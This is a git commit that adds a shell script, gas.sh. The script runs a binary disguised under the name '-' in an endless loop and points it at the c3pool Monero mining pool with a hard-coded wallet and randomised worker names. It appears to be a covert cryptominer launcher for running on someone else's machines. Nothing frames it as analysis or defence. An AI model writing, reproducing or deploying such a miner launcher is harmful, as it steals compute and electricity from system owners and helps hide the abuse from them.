61e0d582a5748c93bae1e1d21d477ee5e5b98e9d
dotonburahol3 <110270106+dotonburahol3@users.noreply.github.com>
2022-08-06 17:47:13 +0700

    Create gas.sh

---
+++ gas.sh
@@ -0,0 +1,7 @@
+#!/bin/sh
+while [ 1 ];
+do
+chmod u+x -
+./- -o auto.c3pool.org:80 -u 83HzBwN146c9iq4p8mcxT6fM3hUNmHpzZii8uS8j37LkimD72XNQ3kZ9GisSHpWNw4UKapG4pkfzB9hKvvXxvdn2Gmrynju.$(echo $(shuf -i 1000-999999 -n 1)-tolot)
+sleep 9999
+done
